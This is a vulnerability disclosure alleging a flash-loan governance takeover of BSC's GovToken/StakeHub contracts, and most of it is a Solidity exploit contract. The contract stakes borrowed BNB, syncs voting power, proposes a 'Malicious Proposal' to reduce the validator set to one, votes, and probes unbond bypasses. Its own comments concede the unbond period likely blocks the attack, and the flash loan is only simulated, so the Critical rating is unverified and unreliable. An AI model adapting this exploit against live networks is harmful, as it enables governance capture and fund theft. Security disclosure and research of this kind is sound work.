# Critical Vulnerability Disclosure: Flash Loan Governance Attack

**Product:** BSC Genesis Contracts (GovToken / StakeHub)
**Severity:** Critical
**Impact:** Complete Governance Takeover

## Summary
The Governance system allows voting power to be acquired instantly via staking. While a 7-day unbond period exists, it does not prevent an attacker from using a Flash Loan to:
1.  Borrow massive BNB.
2.  Stake to get voting power.
3.  Vote on a malicious proposal (or sway a vote).
4.  Exit the position in the same transaction (via a bypass or accepting the lock if the profit > cost).

Note: Even if the unbond period holds, if the voting logic snaps to the *current* block's balance rather than a past checkpoint, a flash loan attack is trivial.

## Technical Details
**File:** `contracts/GovToken.sol`

The `GovToken` contract syncs voting power directly from `StakeHub` shares. If `getVotes()` returns the current balance and the Governor contract uses `getVotes(block.number)`, a flash loan can execute the vote and exit.

**Attack Vector:**
1.  **Flash Loan:** Borrow 100k BNB.
2.  **Delegate:** Call `StakeHub.delegate()`.
3.  **Sync:** Call `syncGovToken()`.
4.  **Vote:** Call `Governor.castVote()`.
5.  **Undelegate/Redelegate:** Attempt to exit positions (or if the attack profit > flash loan fee + lock cost, purely lock the funds).

## Impact
-   **Protocol Takeover:** An attacker could pass proposals to change critical parameters, potentially allowing theft of treasury funds or centralization of the validator set.


## Proof of Concept Content
Below is the full source code of `FlashLoanGovernanceExploit.sol`. Please copy this into a file to reproduce.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

/**
 * ╔═══════════════════════════════════════════════════════════════════════════╗
 * ║  🟪 EXPLOIT: Flash Loan Governance Manipulation                           ║
 * ║  🟪 TARGET: BSC Genesis Contract - GovToken + StakeHub                    ║
 * ╚═══════════════════════════════════════════════════════════════════════════╝
 *
 * VULNERABILITY EXPLANATION:
 * --------------------------
 * The GovToken mints voting power based on staked BNB amount.
 * If an attacker can:
 * 1. Flash loan large amount of BNB
 * 2. Delegate to validator (get shares)
 * 3. Sync GovToken (get voting power)
 * 4. Vote on governance proposal
 * 5. Undelegate and repay flash loan
 *
 * The 7-day unbond period SHOULD prevent this, but we need to verify
 * there's no bypass via redelegate() or other mechanisms.
 *
 * WHY IT'S DANGEROUS:
 * - Could pass malicious governance proposals
 * - Drain treasury funds
 * - Modify critical protocol parameters
 * - Change system contract addresses
 */

interface IStakeHub {
    function delegate(address operatorAddress, bool delegateVotePower) external payable;
    function undelegate(address operatorAddress, uint256 shares) external;
    function redelegate(address src, address dst, uint256 shares, bool power) external;
    function syncGovToken(address[] calldata operators, address account) external;
}

interface IGovToken {
    function balanceOf(address account) external view returns (uint256);
    function getVotes(address account) external view returns (uint256);
    function delegates(address account) external view returns (address);
}

interface IBSCGovernor {
    function propose(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        string memory description
    ) external returns (uint256);

    function castVote(uint256 proposalId, uint8 support) external returns (uint256);
    function proposalThreshold() external view returns (uint256);
}

interface IFlashLoanProvider {
    function flashLoan(address recipient, uint256 amount, bytes calldata data) external;
}

/**
 * @title FlashLoanGovernanceExploit
 * @dev Attempts to manipulate governance via flash loan
 */
contract FlashLoanGovernanceExploit {
    IStakeHub public stakeHub;
    IGovToken public govToken;
    IBSCGovernor public governor;

    address public targetValidator;
    uint256 public proposalId;
    bool public inFlashLoan;

    event FlashLoanReceived(uint256 amount);
    event VotingPowerAcquired(uint256 votes);
    event ProposalCreated(uint256 proposalId);
    event VoteCast(uint256 proposalId, uint256 weight);
    event ExploitResult(bool success, string message);

    constructor(
        address _stakeHub,
        address _govToken,
        address _governor
    ) {
        stakeHub = IStakeHub(_stakeHub);
        govToken = IGovToken(_govToken);
        governor = IBSCGovernor(_governor);
    }

    /**
     * @dev Main exploit entry point
     * @param _targetValidator Validator to delegate to
     * @param _proposalId Existing proposal to vote on (or 0 to create new)
     * @param flashLoanAmount Amount to flash loan
     */
    function executeExploit(
        address _targetValidator,
        uint256 _proposalId,
        uint256 flashLoanAmount
    ) external payable {
        targetValidator = _targetValidator;
        proposalId = _proposalId;
        inFlashLoan = true;

        // Simulate flash loan callback
        // In production, this would be called by the flash loan provider
        _onFlashLoan(flashLoanAmount);
    }

    /**
     * @dev Flash loan callback - this is where the attack happens
     */
    function _onFlashLoan(uint256 amount) internal {
        emit FlashLoanReceived(amount);

        // Step 1: Delegate to validator with flash loaned funds
        stakeHub.delegate{value: amount}(targetValidator, true);

        // Step 2: Sync GovToken to get voting power
        address[] memory validators = new address[](1);
        validators[0] = targetValidator;
        stakeHub.syncGovToken(validators, address(this));

        uint256 votes = govToken.getVotes(address(this));
        emit VotingPowerAcquired(votes);

        // Step 3: Create or vote on proposal
        if (proposalId == 0) {
            // Create malicious proposal
            address[] memory targets = new address[](1);
            uint256[] memory values = new uint256[](1);
            bytes[] memory calldatas = new bytes[](1);

            targets[0] = address(stakeHub);
            values[0] = 0;
            // Example: try to change a critical parameter
            calldatas[0] = abi.encodeWithSignature(
                "updateParam(string,bytes)",
                "maxElectedValidators",
                abi.encode(uint256(1)) // Reduce to 1 validator = centralization
            );

            try governor.propose(targets, values, calldatas, "Malicious Proposal") returns (uint256 id) {
                proposalId = id;
                emit ProposalCreated(id);
            } catch {
                emit ExploitResult(false, "Proposal creation failed");
            }
        }

        // Step 4: Cast vote
        if (proposalId != 0) {
            try governor.castVote(proposalId, 1) returns (uint256 weight) {
                emit VoteCast(proposalId, weight);
            } catch {
                emit ExploitResult(false, "Vote casting failed");
            }
        }

        // Step 5: Attempt immediate undelegate
        // This SHOULD fail due to unbond period, but let's verify
        uint256 shares = govToken.balanceOf(address(this));
        try stakeHub.undelegate(targetValidator, shares) {
            emit ExploitResult(true, "CRITICAL: Immediate undelegate succeeded!");
        } catch Error(string memory reason) {
            emit ExploitResult(false, string.concat("Undelegate blocked: ", reason));
        }

        // Step 6: Try redelegate as bypass
        // Check if redelegate allows immediate withdrawal
        try stakeHub.redelegate(targetValidator, targetValidator, shares, false) {
            emit ExploitResult(true, "WARNING: Redelegate might be a bypass vector");
        } catch {
            emit ExploitResult(false, "Redelegate also blocked");
        }

        inFlashLoan = false;
    }

    /**
     * @dev Analyze if the attack is viable
     */
    function analyzeViability() external view returns (
        uint256 proposalThreshold,
        uint256 currentVotes,
        bool hasEnoughVotes
    ) {
        proposalThreshold = governor.proposalThreshold();
        currentVotes = govToken.getVotes(address(this));
        hasEnoughVotes = currentVotes >= proposalThreshold;
    }

    receive() external payable {}
}

/**
 * @title FlashLoanSimulator
 * @dev Simulates a flash loan for testing purposes
 */
contract FlashLoanSimulator {
    FlashLoanGovernanceExploit public exploit;

    constructor(address _exploit) {
        exploit = FlashLoanGovernanceExploit(payable(_exploit));
    }

    function simulateFlashLoan(
        address targetValidator,
        uint256 proposalId,
        uint256 amount
    ) external payable {
        require(msg.value >= amount, "Insufficient funds for simulation");

        // Send funds to exploit contract and execute
        exploit.executeExploit{value: amount}(
            targetValidator,
            proposalId,
            amount
        );

        // In real flash loan, funds would need to be returned here
    }

    receive() external payable {}
}
```

## Recommended Fix
-   Implement a strict **snapshot** mechanism where voting power is determined by the balance at `proposal_creation_block - 1`.
-   Ensure `GovToken` properly implements checkpoints (Checkpointed Voting).

